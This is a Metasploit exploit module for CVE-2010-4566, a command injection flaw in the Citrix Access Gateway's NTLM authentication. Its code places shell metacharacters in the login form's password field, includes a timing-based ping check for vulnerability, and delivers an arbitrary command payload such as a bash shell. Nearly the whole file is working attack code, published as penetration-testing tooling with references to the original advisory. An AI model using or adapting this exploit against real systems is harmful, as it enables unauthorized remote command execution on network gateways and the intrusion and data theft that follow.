##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Exploit::Remote
  Rank = ExcellentRanking

  include Msf::Exploit::Remote::HttpClient

  def initialize(info = {})
    super(update_info(info,
      'Name'           => 'Citrix Access Gateway Command Execution',
      'Description'    => %q{
          The Citrix Access Gateway provides support for multiple authentication types.
        When utilizing the external legacy NTLM authentication module known as
        ntlm_authenticator the Access Gateway spawns the Samba 'samedit' command
        line utility to verify a user's identity and password.  By embedding shell
        metacharacters in the web authentication form it is possible to execute
        arbitrary commands on the Access Gateway.
      },
      'Author'         =>
        [
          'George D. Gal', # Original advisory
          'Erwin Paternotte', # Exploit module
        ],
      'License'        => MSF_LICENSE,
      'References'     =>
        [
          [ 'CVE', '2010-4566' ],
          [ 'OSVDB', '70099' ],
          [ 'BID', '45402' ],
          [ 'URL', 'http://www.vsecurity.com/resources/advisory/20101221-1/' ]
        ],
      'Privileged'     => false,
      'Payload'        =>
        {
          'Space'       => 127,
          'DisableNops' => true,
          'Compat'      =>
            {
              'PayloadType' => 'cmd cmd_bash',
              #'RequiredCmd' => 'generic telnet bash-tcp'
            }
        },
      'DefaultOptions' =>
        {
          'WfsDelay' => 30
        },
      'Platform'       => [ 'unix' ],
      'Arch'           => ARCH_CMD,
      'Targets'        => [[ 'Automatic', { }]],
      'DisclosureDate' => '2010-12-21',
      'DefaultTarget'  => 0))

    register_options(
      [
        Opt::RPORT(443),
        OptBool.new('SSL', [ true, 'Use SSL', true ]),
      ])

  end

  def post(command, background)
    username = rand_text_alphanumeric(20)

    if background
      sploit = Rex::Text.uri_encode('|' + command + '&')
    else
      sploit = Rex::Text.uri_encode('|' + command)
    end

    data = "SESSION_TOKEN=1208473755272-1381414381&LoginType=Explicit&username="
    data << username
    data << "&password="
    data << sploit

    res = send_request_cgi({
      'uri'     => '/',
      'method'  => 'POST',
      'data'    => data
    }, 25)
  end

  def check
    print_status("Attempting to detect if the Citrix Access Gateway is vulnerable...")

    # Try running/timing 'ping localhost' to determine is system is vulnerable
    start = Time.now
    post("ping -c 10 127.0.0.1", false)
    elapsed = Time.now - start
    if elapsed >= 3
      return Exploit::CheckCode::Vulnerable
    end

    return Exploit::CheckCode::Safe
  end

  def exploit
    cmd = payload.encoded

    if not post(cmd, true)
      fail_with(Failure::Unknown, "Unable to execute the desired command")
    end
  end
end
